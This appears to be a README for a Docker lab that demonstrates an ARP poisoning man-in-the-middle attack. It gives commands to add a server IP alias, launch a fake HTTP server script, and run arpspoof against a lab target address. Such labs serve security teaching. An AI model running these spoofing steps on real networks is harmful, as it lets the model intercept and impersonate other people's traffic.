# ARP Poisoning MITM using Docker containers 

## 1. Start the Containers

```bash
(sudo) docker compose up
```

---

## 2. Add Server IP Alias

```bash
ip addr add 192.168.90.100/32 dev eth0
```

---

## 3. Launch the Fake HTTP Server

```bash
python3 labscripts/fakeserver.py
```

---

## 4. Start ARP Poisoning

```bash
arpspoof -i eth0 -t 192.168.90.101 192.168.90.100 
```